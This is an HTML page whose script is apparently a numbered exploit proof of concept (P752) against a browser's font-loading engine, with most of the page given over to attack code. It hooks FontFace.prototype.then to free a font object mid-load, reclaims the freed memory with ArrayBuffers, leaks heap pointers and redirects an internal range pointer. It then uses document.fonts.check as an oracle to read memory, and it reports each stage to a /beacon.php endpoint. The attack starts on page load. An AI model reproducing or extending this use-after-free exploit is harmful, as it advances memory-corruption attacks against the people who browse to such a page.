<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P752 — Pending Font Reclaim & In-Memory Range Redirection</title>
<script>
'use strict';
/* ============================================================
 * P752 — Pending Font Reclaim & In-Memory Range Redirection
 *
 * Major Architectural Discovery from P751:
 * 1. P751 proved with 100% precision:
 *    - Reclaim with P743 formula (view[12]=P58, view[6]=P58) is 100% rock-solid.
 *    - Active Boolean Oracle decodes 16-byte memory blocks and strings in <100ms.
 * 2. Why previous probes (P731-P744) saw trFam always return true:
 *    - In those probes, trFam used src:local(Arial), so status was Loaded(3).
 *    - Loaded fonts never block check(), returning true regardless of ranges!
 * 3. The Paradigm Shift in P752:
 *    - stTr uses @font-face with src:url(/hang.php?trFam=...)!
 *    - trFam starts in Status::Pending(0) or Status::Loading(1)!
 *    - FACE_B uses local(Helvetica), so .then getter fires synchronously and instantly!
 *    - absW reclaims the freed CSSFontFace of trFam!
 *    - When VIEW_B[4] (m_ranges.m_buffer) is pointed to address ADDR:
 *      WebCore evaluates document.fonts.check('1em trFam', char) against
 *      the range struct *(uint32_t*)ADDR!
 *    - In-range characters return FALSE; out-of-range characters return TRUE!
 *
 * Objectives of P752:
 * 1. Step 1: Baseline Heap Leak (P58, P68).
 * 2. Step 2: Pending Font Reclaim (stTr with /hang.php, FACE_B with local).
 * 3. Phase A: Verify Reclaimed Pending Font Behavior:
 *    - Query check('1em trFam', 0x47) (expect false if in range).
 *    - Query check('1em trFam', 'A') (expect true if out of range).
 * 4. Phase B: Direct Range Pointer Redirection to Controlled Memory (P58):
 *    - Configure VIEW_B[0] = 0x0000004300000041n ('A'..'C').
 *    - Set VIEW_B[4] = P58 and VIEW_B[5] = 0x100000001.
 *    - Query check('1em trFam', 'A') and check('1em trFam', 'D').
 * 5. Phase C: Memory Mutation Proof:
 *    - Change VIEW_B[0] = 0x0000004D00000047n ('G'..'M').
 *    - Query check('1em trFam', 'G') and check('1em trFam', 'A').
 * 6. Phase D: Active Oracle Baseline Verification (dual telemetry).
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P752-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

var OUT=null;
function log(s){
  if(!OUT) OUT=document.getElementById('out');
  if(OUT) OUT.textContent += s + '\n';
}

function pad4(n){
  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
}

function pad2(n){
  return ('00' + Number(n).toString(16).toUpperCase()).slice(-2);
}

function makeRange(lo, hi){
  if(lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

var P58=null, P68=null;
var FACE_B=null, BUF_B=null, VIEW_B=null;
var ACT_FACE=null;
var LEAK_BUF=null;

function run(){
  OUT=document.getElementById('out');
  if(OUT) OUT.textContent='=== P752 Pending Font Reclaim & Memory Redirection ===\n\n';
  b('BOOT','p752-pending-reclaim');

  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');

    log('[Step 2] Executing Pending Font Reclaim (stTr with /hang.php)...');
    doPendingReclaim(function(){
      log('\n[Phase A] Verifying Reclaimed Pending Font Range Behavior...');
      phaseA_verifyPendingFont(function(){
        log('\n[Phase B] Pointing Range Vector to Controlled Memory (P58)...');
        phaseB_redirectRangesToP58(function(){
          log('\n[Phase C] In-Memory Range Mutation Verification...');
          phaseC_memoryMutationTest(function(){
            log('\n[Phase D] Active Oracle Baseline Control...');
            phaseD_oracleBaseline(function(){
              b('DONE','p752-complete');
              log('\n=== P752 Complete! ===');
            });
          });
        });
      });
    });
  });
}

/* ---- Step 1: Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st=document.createElement('style');
  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);
  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face); void face.loaded;

  var abs=[],fired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove();st.textContent='';st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
    LEAK_BUF = abs[best];
    var v=new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb,100);
  },350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2=document.createElement('style');
  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);
  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2); void face2.loaded;
  var abs2=[],fired2=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove();st2.textContent='';st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});
  document.fonts.load('1em fl1, lk1','CD');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
    LEAK_BUF = abs2[best];
    var v=new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb,100);
  },400);
}

function extractPtrs(v){
  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
  if(v[11] >= LO && v[11] < HI) P58 = v[11];
  if(v[13] >= LO && v[13] < HI) P68 = v[13];
  if(!P58 || !P68){
    for(var q=0;q<24;q++){
      var val=v[q];
      if(val>=LO&&val<HI){
        if(!P58) P58=val;
        else if(!P68&&val!==P58) P68=val;
      }
    }
  }
  if(!P68) P68=0n;
}

/* ---- Step 2: Pending Font Reclaim ---- */
function doPendingReclaim(cb){
  b('REC-START','fill_q12_q6=0x'+h16(P58));

  /* stTr uses /hang.php so its CSSFontFace starts in Status::Pending/Loading! */
  var stTr=document.createElement('style');
  stTr.textContent='@font-face{font-family:trFam;src:url(/hang.php?trPending=' + Date.now() + ');unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  /* FACE_B uses local(Helvetica) so its .loaded promise resolves synchronously! */
  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW=[],firedW=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(firedW) return undefined; firedW=true;
      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;

      for(var k=0;k<80;k++){
        var ab=new ArrayBuffer(192);
        var view=new BigUint64Array(ab);
        view[12]=P58;
        view[6]=P58;
        absW.push(ab);
      }

      try{document.fonts.check('1em trFam');}catch(e){}
      return undefined;
    },set:function(){}});

  document.fonts.load('1em trFace, trFam','GH');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<absW.length;i++){
      var u=new Uint8Array(absW[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}

    BUF_B=absW[best];
    VIEW_B=new BigUint64Array(BUF_B);

    var dump0_11=[], dump12_23=[];
    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));

    b('RECLAIM-OK','baseK='+best);
    b('DUMP-Q0-Q11', dump0_11.join(';'));
    b('DUMP-Q12-Q23', dump12_23.join(';'));
    log('Pending Font Reclaim OK at slot '+best);

    setTimeout(cb,150);
  },400);
}

/* ---- Phase A: Verify Reclaimed Pending Font Range Behavior ---- */
function phaseA_verifyPendingFont(cb){
  /* Test character 'G' (0x47, declared unicode-range of trFam) vs 'A' (0x41) */
  var chG = document.fonts.check('1em trFam', 'G');
  var chA = document.fonts.check('1em trFam', 'A');
  var chD = document.fonts.check('1em trFam', 'D');

  var rep = 'chG=' + chG + '|chA=' + chA + '|chD=' + chD;
  b('A-PENDING-CHECK', rep);
  log('Phase A Reclaimed trFam Check: G=' + chG + ' (in range), A=' + chA + ', D=' + chD);

  setTimeout(cb, 50);
}

/* ---- Phase B: Point Range Vector to Controlled Memory (P58) ---- */
function phaseB_redirectRangesToP58(cb){
  if(!VIEW_B){ b('B-SKIP','no-view'); cb(); return; }

  /* Seed P58 + 0x00 with UnicodeRange 'A'..'C' (from=0x41, to=0x43) */
  VIEW_B[0] = 0x0000004300000041n;

  /* Point m_ranges.m_buffer (q4) to P58, set capacity/size to 1 (q5) */
  VIEW_B[4] = P58;
  VIEW_B[5] = 0x0000000100000001n;

  /* Query character 'A' (in range 'A'..'C') and 'D'/'G' (out of range) */
  var chA = document.fonts.check('1em trFam', 'A');
  var chB = document.fonts.check('1em trFam', 'B');
  var chD = document.fonts.check('1em trFam', 'D');
  var chG = document.fonts.check('1em trFam', 'G');

  var rep = 'target=A-C|chA=' + chA + '|chB=' + chB + '|chD=' + chD + '|chG=' + chG;
  b('B-REDIRECT-A-C', rep);
  log('Phase B P58 Target (A-C): A=' + chA + ', B=' + chB + ', D=' + chD + ', G=' + chG);

  setTimeout(cb, 50);
}

/* ---- Phase C: In-Memory Range Mutation Verification ---- */
function phaseC_memoryMutationTest(cb){
  if(!VIEW_B){ b('C-SKIP','no-view'); cb(); return; }

  /* Mutate memory at P58 + 0x00 to range 'H'..'K' (from=0x48, to=0x4B) */
  VIEW_B[0] = 0x0000004B00000048n;
  VIEW_B[4] = P58;
  VIEW_B[5] = 0x0000000100000001n;

  var chH = document.fonts.check('1em trFam', 'H');
  var chA = document.fonts.check('1em trFam', 'A');
  var chZ = document.fonts.check('1em trFam', 'Z');

  var rep = 'target=H-K|chH=' + chH + '|chA=' + chA + '|chZ=' + chZ;
  b('C-MUTATION-H-K', rep);
  log('Phase C P58 Mutated (H-K): H=' + chH + ', A=' + chA + ', Z=' + chZ);

  setTimeout(cb, 50);
}

/* ---- Phase D: Active Oracle Baseline Control ---- */
function phaseD_oracleBaseline(cb){
  try {
    ACT_FACE = new FontFace('actFam', 'url(/hang.php?nocache=' + Date.now() + ')', {unicodeRange: 'U+0050-0055'});
    document.fonts.add(ACT_FACE);
    ACT_FACE.load().catch(function(){});

    var st = ACT_FACE.status;
    var chS = document.fonts.check('1em actFam', 'S');
    var chA = document.fonts.check('1em actFam', 'A');

    var rep = 'status=' + st + '|inS=' + chS + '|outA=' + chA;
    b('D-ORACLE-BASELINE', rep);
    log('Phase D Oracle Baseline: ' + rep);
  } catch(e){
    b('D-ORACLE-ERR', e.message);
  }
  setTimeout(cb, 50);
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
